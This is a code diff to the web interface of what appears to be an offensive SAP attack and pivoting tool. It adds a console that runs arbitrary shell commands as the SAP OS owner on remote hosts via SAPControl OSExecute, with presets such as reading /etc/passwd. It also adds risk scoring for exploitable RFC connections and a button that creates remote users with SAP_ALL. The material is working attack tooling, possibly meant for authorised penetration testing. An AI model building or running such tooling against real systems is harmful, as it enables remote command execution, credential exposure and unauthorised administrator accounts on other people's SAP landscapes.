@@ -1606,6 +1606,48 @@ body {
   </div>
 </div>
 
+<!-- SAPControl OSExecute Modal -->
+<div class="modal-overlay" id="osexecute-modal">
+  <div class="modal" style="max-width:820px;width:95vw">
+    <h3>&#9889; OS Command via SAPControl OSExecute</h3>
+    <div id="osexecute-context" style="font-size:12px;color:#8b949e;margin-bottom:8px"></div>
+    <div style="font-size:11px;color:#8b949e;margin-bottom:10px;line-height:1.5">
+      Runs the command as <code>&lt;sid&gt;adm</code> — the OS user that owns the SAP install
+      on the target host.  Output is captured and returned when the child exits (or the
+      timeout expires, whichever is first).  Commands with shell metacharacters
+      (<code>|</code>, <code>&amp;&amp;</code>, redirects) work as expected — the SAP kernel
+      spawns the child through a shell.
+    </div>
+    <div class="form-row">
+      <label>Command</label>
+      <input type="text" id="osexecute-cmd" placeholder="whoami"
+             onkeydown="if(event.key==='Enter'){event.preventDefault();runOSExecute();}">
+    </div>
+    <div class="form-row" style="display:flex;gap:12px;align-items:center">
+      <div style="flex:1">
+        <label>Timeout (seconds)</label>
+        <input type="number" id="osexecute-timeout" value="30" min="1" max="300" style="width:100px">
+      </div>
+      <div style="flex:2;font-size:10px;color:#484f58;line-height:1.4">
+        Presets:
+        <a href="#" onclick="event.preventDefault();document.getElementById('osexecute-cmd').value='whoami'"><code>whoami</code></a> ·
+        <a href="#" onclick="event.preventDefault();document.getElementById('osexecute-cmd').value='id'"><code>id</code></a> ·
+        <a href="#" onclick="event.preventDefault();document.getElementById('osexecute-cmd').value='uname -a'"><code>uname -a</code></a> ·
+        <a href="#" onclick="event.preventDefault();document.getElementById('osexecute-cmd').value='cat /etc/passwd'"><code>cat /etc/passwd</code></a> ·
+        <a href="#" onclick="event.preventDefault();document.getElementById('osexecute-cmd').value='ls -la /usr/sap'"><code>ls /usr/sap</code></a>
+      </div>
+    </div>
+    <div class="form-row">
+      <label>Output</label>
+      <pre id="osexecute-output" style="background:#0d1117;border:1px solid #30363d;padding:8px;border-radius:4px;max-height:340px;overflow:auto;font-size:11px;color:#e6edf3;white-space:pre-wrap;word-break:break-all;margin:0"></pre>
+    </div>
+    <div class="form-actions">
+      <button class="btn btn-primary" onclick="runOSExecute()">Run</button>
+      <button class="btn" onclick="closeModal('osexecute-modal')">Close</button>
+    </div>
+  </div>
+</div>
+
 <!-- Table Download Modal -->
 <div class="modal-overlay" id="table-modal">
   <div class="modal">
@@ -2989,7 +3031,11 @@ function updateMap() {
     let dashArray = '';
     const isHttp = (conn.conn_type || '') === 'http';
     const isTrusted = !!conn.trusted_system;
-    if (conn.has_sap_all && conn.logon_successful) {
+    if (conn.os_exec_verified) {
+      // OS shell as <sid>adm via SAPControl OSExecute — beats
+      // SAP_ALL (kernel vs application level).  Deep red + thick.
+      color = '#c0392b'; width = 7;
+    } else if (conn.has_sap_all && conn.logon_successful) {
       color = '#e74c3c'; width = 6;
     } else if (conn.sapxpg_remote_works) {
       color = '#ff6b35'; width = 5.5; dashArray = '8,4';
@@ -6515,11 +6561,33 @@ function showConnInfo(e, connIdx) {
   const isHttp = (conn.conn_type || '') === 'http';
   const isTypeT = !isHttp && !!conn.sapxpg_remote_works;
   const isTrusted = !!conn.trusted_system;
-  const connType = isHttp ? 'HTTP' : (isTypeT ? 'T' : (isTrusted ? '3 Trusted' : '3'));
-  let risk;
+  // For HTTP destinations, show the raw RFCTYPE (G = HTTP to
+  // external server; H = HTTP to ABAP system) when we've captured
+  // it — operator asked for the distinction because G and H differ
+  // in exploitation surface (H targets accept SOAP-RFC RFC_PING,
+  // G targets typically don't).
+  let connType;
   if (isHttp) {
-    risk = (conn.rfc_user && conn.secstore_password)
-           ? 'MEDIUM' : 'UNKNOWN';
+    const rt = (conn.rfc_type || '').toUpperCase();
+    if (rt === 'G')       connType = 'G — HTTP → external';
+    else if (rt === 'H')  connType = 'H — HTTP → ABAP';
+    else                  connType = 'HTTP';
+  } else if (isTypeT) {
+    connType = 'T';
+  } else if (isTrusted) {
+    connType = '3 Trusted';
+  } else {
+    connType = '3';
+  }
+  let risk;
+  if (conn.os_exec_verified) {
+    // OS shell via SAPControl OSExecute — kernel-level, beats
+    // SAP_ALL and every other classification.
+    risk = 'CRITICAL';
+  } else if (isHttp) {
+    risk = conn.has_sap_all && conn.logon_successful ? 'CRITICAL' :
+      conn.logon_successful ? 'MEDIUM' :
+      (conn.rfc_user && conn.secstore_password) ? 'MEDIUM' : 'UNKNOWN';
   } else if (isTypeT) {
     risk = conn.ping_ok ? 'CRITICAL' : conn.tested ? 'LOW' : 'UNKNOWN';
   } else if (isTrusted) {
@@ -6633,6 +6701,7 @@ function showConnInfo(e, connIdx) {
     })() : ''}
     ${(isHttp && conn.soap_rfc_verified && !conn.has_sap_all) ? `<div class="info-section" style="color:#8b949e;font-size:11px">Create Remote User will attempt BAPI_USER_CREATE1 + SAP_ALL via SOAP-RFC. The user's authorization for these BAPIs (S_USER_GRP, S_USER_PRO) is checked at click time.</div>` : ''}
     <div style="text-align:right;margin-top:8px;display:flex;gap:6px;justify-content:flex-end;flex-wrap:wrap">
+      ${conn.os_exec_verified ? `<button class="btn" style="background:#c0392b;color:#fff;font-weight:600" onclick="openOSExecuteModal('${escHtml(conn.source_sid)}','${escHtml(conn.destination_name)}')">&#9889; OS Command (via SAPControl)</button>` : ''}
       ${(!isTypeT && conn.logon_successful && (conn.has_sap_all || conn.soap_rfc_verified) && conn.target_sid) ?
         `<button class="btn" style="background:#b33;color:#fff" onclick="createUserOnTarget('${escHtml(conn.source_sid)}','${escHtml(conn.destination_name)}','${escHtml(conn.target_sid)}')">Create Remote User</button>` : ''}
       ${isTypeT ? '' :
@@ -6678,6 +6747,44 @@ async function createUserViaRfc(sourceSid, destName, targetSid) {
     target_sid: targetSid
   });
   startPolling();
+}
+
+let _osExecuteCtx = { sid: '', destName: '' };
+function openOSExecuteModal(sid, destName) {
+  _osExecuteCtx.sid = sid;
+  _osExecuteCtx.destName = destName;
+  const conn = (mapState.connections || []).find(
+    c => c.source_sid === sid && c.destination_name === destName);
+  const info = conn
+    ? `<strong>${escHtml(sid)}</strong> &rarr; ${escHtml(conn.target_sid || '?')} `
+      + `via <code>${escHtml(destName.slice(0, 32))}${destName.length > 32 ? '…' : ''}</code>`
+      + ` &nbsp; <span style="color:#8b949e">as ${escHtml(conn.rfc_user || '?')} on ${escHtml(conn.http_url || '?')}</span>`
+    : `${escHtml(sid)} &rarr; ${escHtml(destName)}`;
+  document.getElementById('osexecute-context').innerHTML = info;
+  document.getElementById('osexecute-cmd').value = 'whoami';
+  document.getElementById('osexecute-timeout').value = '30';
+  document.getElementById('osexecute-output').textContent = '';
+  document.getElementById('osexecute-modal').classList.add('visible');
+  setTimeout(() => document.getElementById('osexecute-cmd').focus(), 50);
+}
+async function runOSExecute() {
+  const cmd = (document.getElementById('osexecute-cmd').value || '').trim();
+  const timeout = parseInt(document.getElementById('osexecute-timeout').value) || 30;
+  const outEl = document.getElementById('osexecute-output');
+  if (!cmd) { alert('Command required.'); return; }
+  outEl.textContent = `[*] Running: ${cmd}\n[*] Timeout: ${timeout}s\n[*] Waiting for output…\n`;
+  const r = await api('POST', `node/${_osExecuteCtx.sid}/sapcontrol_osexecute`, {
+    destination_name: _osExecuteCtx.destName,
+    command: cmd,
+    timeout: timeout,
+  });
+  if (r && r.error) {
+    outEl.textContent = `[-] Error: ${r.error}`;
+    return;
+  }
+  const header = `[+] exit=${r.exit_code}  pid=${r.pid}  status=HTTP ${r.status}\n`
+                + `----- output (${(r.output||'').length} bytes) -----\n`;
+  outEl.textContent = header + (r.output || '<no output>');
 }
 
 // Generic dispatcher — routes BTP-sourced edges to /api/btp/* endpoints,
